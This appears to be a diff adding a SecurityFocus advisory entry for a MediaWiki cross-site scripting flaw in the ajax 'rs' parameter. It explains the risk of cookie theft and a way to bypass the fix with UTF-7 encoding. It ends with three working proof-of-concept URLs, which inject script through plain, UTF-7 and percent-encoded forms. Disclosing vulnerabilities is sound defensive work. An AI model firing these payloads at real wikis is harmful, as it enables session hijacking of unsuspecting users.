@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/21956/info
+
+MediaWiki is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+UPDATE: Although a fix was issued to address this issue, attackers may bypass the fix by encoding an exploit in UTF-7.
+
+v1.8.2 and below: http://www.example.com/wiki/index.php?action=ajax&rs=%3Cscript%3Ewindow.open('http://www.example2.com')%3C/script%3E v1.8.3 - v1.9.2 http://www.example.com/wiki/index.php?action=ajax&rs=+ADw-SCRIPT+AD4-window.open('http://www.example2.com');+ADw-/SCRIPT+AD4- http://www.example.com/wiki/index.php?action=ajax&rs=%2B%41%44%77%2D%53%43%52%49%50%54%2B%41%44%34%2D%61%6C%65%72%74%28%27%58%53%53%27%29%3B%2B%41%44%77%2D%2F%53%43%52%49%50%54%2B%41%44%34%2D
